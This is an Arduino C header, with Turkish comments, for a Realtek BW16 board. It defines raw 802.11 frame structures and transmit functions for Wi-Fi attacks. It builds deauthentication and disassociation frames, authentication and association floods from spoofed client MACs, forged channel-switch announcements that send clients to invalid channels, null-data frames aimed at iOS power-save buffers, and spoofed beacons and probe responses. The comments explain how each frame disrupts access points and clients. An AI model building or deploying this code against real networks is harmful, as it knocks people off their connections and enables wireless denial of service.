#ifndef WIFI_CUST_TX
#define WIFI_CUST_TX

#include <Arduino.h>

/*
 * CRITICAL: __attribute__((packed)) zorunlu.
 * ARM Cortex-M33 derleyicisi uint8_t dizileri arasına hizalama padding'i ekler
 * → frame layout bozulur → inject edilen frame geçersiz olur.
 */

typedef struct __attribute__((packed)) {
  uint16_t frame_control   = 0x00C0; // Management, Deauth
  uint16_t duration        = 0xFFFF;
  uint8_t  destination[6];
  uint8_t  source[6];
  uint8_t  access_point[6];
  uint16_t sequence_number = 0;
  uint16_t reason          = 0x0002;
} DeauthFrame;

typedef struct __attribute__((packed)) {
  uint16_t frame_control   = 0x00A0; // Management, Disassoc
  uint16_t duration        = 0xFFFF;
  uint8_t  destination[6];
  uint8_t  source[6];
  uint8_t  access_point[6];
  uint16_t sequence_number = 0;
  uint16_t reason          = 0x0008;
} DisassocFrame;

/*
 * Authentication Request (0xB0) — PMF'den muaf, AP tablosunu flood eder.
 */
typedef struct __attribute__((packed)) {
  uint16_t frame_control   = 0x00B0;
  uint16_t duration        = 0x013A;
  uint8_t  destination[6];
  uint8_t  source[6];
  uint8_t  access_point[6];
  uint16_t sequence_number = 0;
  uint16_t auth_algorithm  = 0x0000; // Open System
  uint16_t auth_seq        = 0x0001; // Seq 1 = request
  uint16_t status_code     = 0x0000;
} AuthReqFrame;

/*
 * Association Request (0x0000) — Auth flood ile birlikte AP slot'larını kilitler.
 */
typedef struct __attribute__((packed)) {
  uint16_t frame_control    = 0x0000;
  uint16_t duration         = 0x013A;
  uint8_t  destination[6];
  uint8_t  source[6];
  uint8_t  access_point[6];
  uint16_t sequence_number  = 0;
  uint16_t capabilities     = 0x0431; // ESS, Short Preamble, Short Slot
  uint16_t listen_interval  = 0x000A;
  uint8_t  ssid_tag         = 0x00;
  uint8_t  ssid_length      = 0x00;
} AssocReqFrame;

/*
 * Channel Switch Announcement (0x00D0) — istemcileri geçersiz kanala gönderir.
 */
typedef struct __attribute__((packed)) {
  uint16_t frame_control   = 0x00D0;
  uint16_t duration        = 0xFFFF;
  uint8_t  destination[6];
  uint8_t  source[6];
  uint8_t  access_point[6];
  uint16_t sequence_number = 0;
  uint8_t  category        = 0x00; // Spectrum Management
  uint8_t  action          = 0x04; // CSA
  uint8_t  csa_ie_tag      = 0x25; // IE ID 37
  uint8_t  csa_ie_len      = 0x03;
  uint8_t  csa_mode        = 0x01; // Mode 1: stop TX before switch
  uint8_t  new_channel;
  uint8_t  csa_count       = 0x01;
} CSAFrame;

/*
 * Null Data frame (PM=1) — AP'nin power-save buffer'ını doldurur (iOS saldırısı).
 * Frame Control = 0x1148: Type=Data, Subtype=Null, ToDS=1, PM=1
 */
typedef struct __attribute__((packed)) {
  uint16_t frame_control   = 0x1148;
  uint16_t duration        = 0x0000;
  uint8_t  destination[6]; // Addr1: AP BSSID
  uint8_t  source[6];      // Addr2: Spoofed client MAC
  uint8_t  access_point[6];// Addr3: AP BSSID
  uint16_t sequence_number = 0;
} NullDataFrame;

/*
 * Realtek closed-source SDK sembolleri
 * rltk_wlan_info: WLAN0 (STA/inject) için kullanılır.
 * WiFi.apbegin() her zaman WLAN1 (SoftAP) kullanır — tamamen bağımsız arayüzler.
 * Bu nedenle wext_set_channel(WLAN0_NAME) AP'yi (WLAN1) HİÇ ETKİLEMEZ.
 */
extern uint8_t* rltk_wlan_info;
extern "C" void* alloc_mgtxmitframe(void* ptr);
extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);
extern "C" int dump_mgntframe(void* ptr, void* frame_control);

/*
 * RF performans optimizasyonu — setup() içinde WiFi.apbegin() sonrası çağrılır.
 * IPS + LPS devre dışı bırakır → TX'i sıfır gecikmeyle çalıştırır.
 */
extern "C" int wifi_disable_powersave(void);

void wifi_tx_raw_frame(void* frame, size_t length);
void wifi_tx_deauth_frame(void* src_mac, void* dst_mac, uint16_t reason = 0x02);
void wifi_tx_disassoc_frame(void* src_mac, void* dst_mac, uint16_t reason = 0x08);
void wifi_tx_auth_frame(void* ap_mac, void* fake_client_mac);
void wifi_tx_assoc_frame(void* ap_mac, void* fake_client_mac);
void wifi_tx_csa_frame(void* ap_mac, uint8_t new_channel);
void wifi_tx_null_frame(void* ap_mac, void* fake_client_mac);

/*
 * wifi_tx_beacon_frame — channel parametresi ile:
 *   Araştırma bulgusu (Evil-BW16, tesa-klebeband, deepwiki.com/7h30th3r0n3):
 *   Sadece SSID IE içeren beacon'lar pek çok istemci tarafından görmezden gelinir.
 *   Standart uyumlu beacon için şunlar zorunludur:
 *     IE 0x01 — Supported Rates (2.4GHz ve 5GHz için farklı değerler)
 *     IE 0x03 — DS Parameter Set (kanal bilgisi — 5GHz için kritik!)
 */
void wifi_tx_beacon_frame(void* src_mac, void* dst_mac, const char* ssid, uint8_t channel = 6);

/*
 * wifi_tx_probe_resp_frame — channel + Supported Rates + DS Parameter Set ile:
 *   Realtek/TP-Link sürücüsü "AP güvenliği kaldırdı" sanır → keser.
 *   Eksik IE'lerle bazı sürücüler probe response'ı geçersiz sayar.
 */
void wifi_tx_probe_resp_frame(void* ap_mac, const char* ssid, uint8_t channel = 6);

#endif
